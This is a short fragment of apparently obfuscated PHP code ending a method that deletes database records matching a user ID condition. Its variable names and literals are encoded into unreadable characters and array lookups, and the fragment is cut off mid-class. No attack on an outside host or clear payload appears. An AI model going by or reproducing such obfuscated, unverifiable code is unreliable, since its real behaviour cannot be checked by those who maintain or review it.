array($B’ƒ’µﬂÍÃ[1528] => USER_ID, $B’ƒ’µﬂÍÃ[415] => $D»ó®àÚâı, $B’ƒ’µﬂÍÃ[464] => array($B’ƒ’µﬂÍÃ[981], 0)); return $this->where($f≤™ıœöπ‹)->delete(); } }